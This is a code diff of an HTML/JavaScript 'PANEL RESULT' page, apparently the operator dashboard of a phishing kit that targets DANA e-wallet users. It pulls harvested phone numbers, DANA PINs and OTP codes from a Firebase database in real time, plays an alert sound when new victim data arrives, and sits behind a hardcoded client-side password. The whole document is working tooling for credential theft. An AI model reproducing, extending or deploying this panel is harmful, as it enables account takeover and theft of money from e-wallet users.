@@ -3,14 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Login Required</title>
+    <title>Admin Panel - Protected Extra</title>
+    
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
     <style>
         * { box-sizing: border-box; }
         body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
         
-        /* Gaya Tampilan Login */
+        /* Login Overlay */
         #login-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #108EE9; display: flex; align-items: center; justify-content: center; z-index: 9999;
@@ -19,117 +21,136 @@
             background: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 350px;
             text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
-        .login-box h2 { margin-top: 0; color: #333; font-size: 20px; }
-        .login-box input {
-            width: 100%; padding: 12px; margin: 10px 0;
-            border: 1px solid #ddd; border-radius: 8px; outline: none;
-        }
-        .login-box button {
-            width: 100%; padding: 12px; background: #108EE9; color: white;
-            border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
-        }
+        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
+        .login-box button { width: 100%; padding: 12px; background: #108EE9; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
 
-        /* Gaya Panel Admin (Sama seperti sebelumnya) */
-        #admin-content { display: none; } /* Tersembunyi sebelum login */
-        .header { background: #108EE9; color: white; padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; }
+        /* Admin Content */
+        #admin-content { display: none; }
+        .header { background: #108EE9; color: white; padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; position: relative; }
+        .status { font-size: 12px; opacity: 0.8; margin-top: 5px; }
+        
         .container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
-        .card { background: white; border-radius: 12px; padding: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-top: 6px solid #108EE9; }
+        .card { background: white; border-radius: 12px; padding: 20px; box-shadow: 0 6px 15px rgba(0,0,0,0.05); border-top: 6px solid #108EE9; transition: 0.3s; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
         .method-tag { background: #E1F1FF; color: #108EE9; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: bold; }
-        .value { font-size: 18px; font-weight: bold; color: #333; display: block; margin-top: 5px; font-family: monospace; }
+        
+        .data-row { margin-bottom: 12px; }
+        .label { font-size: 11px; color: #7A848F; display: block; }
+        .value { font-size: 17px; font-weight: bold; color: #333; font-family: monospace; letter-spacing: 1px; }
         .otp-value { color: #d32f2f; }
-        .btn-delete { background: #ff4d4d; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; float: right; }
+        
+        .btn-delete { background: #ff4d4d; color: white; border: none; padding: 5px 10px; border-radius: 6px; cursor: pointer; font-size: 11px; }
+        .empty-state { text-align: center; padding: 50px; color: #7A848F; grid-column: 1/-1; }
     </style>
 </head>
 <body>
 
     <div id="login-overlay">
         <div class="login-box">
-            <h2>Admin Login</h2>
-            <input type="text" id="user" placeholder="Username">
-            <input type="password" id="pass" placeholder="Password">
-            <button onclick="cekLogin()">MASUK</button>
-            <p id="pesan-salah" style="color: red; font-size: 12px; display: none;">Username atau Password Salah!</p>
+            <h2 style="margin-top:0">Admin Access</h2>
+            <input type="text" id="userInput" placeholder="Username">
+            <input type="password" id="passInput" placeholder="Password">
+            <button onclick="prosesLogin()">MASUK</button>
+            <p id="errLog" style="color:red; font-size:12px; display:none">Login Gagal!</p>
         </div>
     </div>
 
     <div id="admin-content">
         <div class="header">
-            <h1>PANEL RESULT - PROTECTED EXTRA</h1>
-            <div id="db-status">Menghubungkan ke Firebase...</div>
-            <button onclick="logout()" style="margin-top:10px; border:none; background:rgba(255,255,255,0.2); color:white; padding:5px 15px; border-radius:5px; cursor:pointer;">Logout</button>
+            <h1>PANEL RESULT</h1>
+            <div id="db-status" class="status">Menghubungkan...</div>
+            <button onclick="location.reload()" style="position:absolute; right:15px; top:15px; background:rgba(255,255,255,0.2); border:none; color:white; border-radius:5px; padding:5px 10px; cursor:pointer">Logout</button>
         </div>
 
         <div class="container" id="data-display">
-            <div style="text-align: center; width: 100%;">Memuat data...</div>
+            <div class="empty-state">Menunggu data...</div>
         </div>
     </div>
 
-    <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+    <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
     <script>
-        // --- ATUR USERNAME & PASSWORD DI SINI ---
-        const ADMIN_USER = "admin"; 
-        const ADMIN_PASS = "admin1"; 
+        // --- PENGATURAN LOGIN ---
+        const USER_ADMIN = "admin";
+        const PASS_ADMIN = "dana2024";
 
-        // Fungsi Login
-        function cekLogin() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-
-            if (u === ADMIN_USER && p === ADMIN_PASS) {
+        function prosesLogin() {
+            const u = document.getElementById('userInput').value;
+            const p = document.getElementById('passInput').value;
+            if(u === USER_ADMIN && p === PASS_ADMIN) {
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('admin-content').style.display = 'block';
-                mulaiFirebase(); // Jalankan firebase hanya setelah login berhasil
+                initAdmin();
             } else {
-                document.getElementById('pesan-salah').style.display = 'block';
+                document.getElementById('errLog').style.display = 'block';
             }
         }
 
-        function logout() {
-            location.reload();
-        }
-
-        // --- FIREBASE LOGIC ---
-        function mulaiFirebase() {
+        // --- FIREBASE CORE ---
+        function initAdmin() {
             const firebaseConfig = { databaseURL: "https://admin-panel-5c204-default-rtdb.firebaseio.com/" };
-            if (!firebase.apps.length) {
-                firebase.initializeApp(firebaseConfig);
-            }
+            if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
             const db = firebase.database();
+            const dataRef = db.ref('data_masuk');
+
+            let lastCount = 0;
             let firstLoad = true;
 
-            db.ref('data_masuk').on('value', (snapshot) => {
+            dataRef.on('value', (snapshot) => {
                 const display = document.getElementById('data-display');
-                document.getElementById('db-status').innerText = "📡 Database Online";
+                const sound = document.getElementById('notifSound');
                 const data = snapshot.val();
                 
+                document.getElementById('db-status').innerText = "📡 Database Online (Real-time)";
+
                 if (data) {
-                    if (!firstLoad) document.getElementById('notifSound').play().catch(() => {});
+                    const keys = Object.keys(data);
+                    const currentCount = keys.length;
+
+                    // Trigger suara jika ada data baru masuk atau data lama berubah (update PIN/OTP)
+                    if (!firstLoad) {
+                        sound.currentTime = 0;
+                        sound.play().catch(e => console.log("Sound error:", e));
+                    }
+
                     display.innerHTML = '';
-                    Object.keys(data).reverse().forEach((key) => {
+                    keys.reverse().forEach((key) => {
                         const item = data[key];
-                        display.innerHTML += `
-                            <div class="card">
-                                <button class="btn-delete" onclick="hapus('${key}')">Hapus</button>
+                        const card = document.createElement('div');
+                        card.className = 'card';
+                        card.innerHTML = `
+                            <div class="card-header">
                                 <span class="method-tag">${item.metode || 'DANA'}</span>
-                                <div style="margin-top:15px">
-                                    <small>NOMOR HP</small><span class="value">${item.nomor_hp || '-'}</span>
-                                    <small>PIN</small><span class="value">${item.pin || '...'}</span>
-                                    <small>OTP</small><span class="value otp-value">${item.otp || '...'}</span>
-                                </div>
-                                <div style="font-size:10px; color:#999; margin-top:10px">${item.waktu || ''}</div>
-                            </div>`;
+                                <button class="btn-delete" onclick="hapusData('${key}')">Hapus</button>
+                            </div>
+                            <div class="data-row">
+                                <span class="label">NOMOR HP</span>
+                                <span class="value">${item.nomor_hp || '-'}</span>
+                            </div>
+                            <div class="data-row">
+                                <span class="label">PIN DANA</span>
+                                <span class="value">${item.pin || '<span style="color:#ccc">Wait...</span>'}</span>
+                            </div>
+                            <div class="data-row">
+                                <span class="label">KODE OTP</span>
+                                <span class="value otp-value">${item.otp || '<span style="color:#ccc">Wait...</span>'}</span>
+                            </div>
+                            <div style="font-size:10px; color:#bbb; text-align:right">${item.waktu || ''}</div>
+                        `;
+                        display.appendChild(card);
                     });
+                    
                     firstLoad = false;
+                    lastCount = currentCount;
                 } else {
-                    display.innerHTML = '<div style="text-align:center; width:100%">Belum ada data.</div>';
+                    display.innerHTML = '<div class="empty-state">Belum ada data masuk.</div>';
                 }
             });
 
-            window.hapus = function(id) {
-                if(confirm('Hapus data?')) db.ref('data_masuk/' + id).remove();
+            window.hapusData = function(id) {
+                if(confirm('Hapus result ini?')) db.ref('data_masuk/' + id).remove();
             }
         }
     </script>
 </body>
-  </html>
+</html>
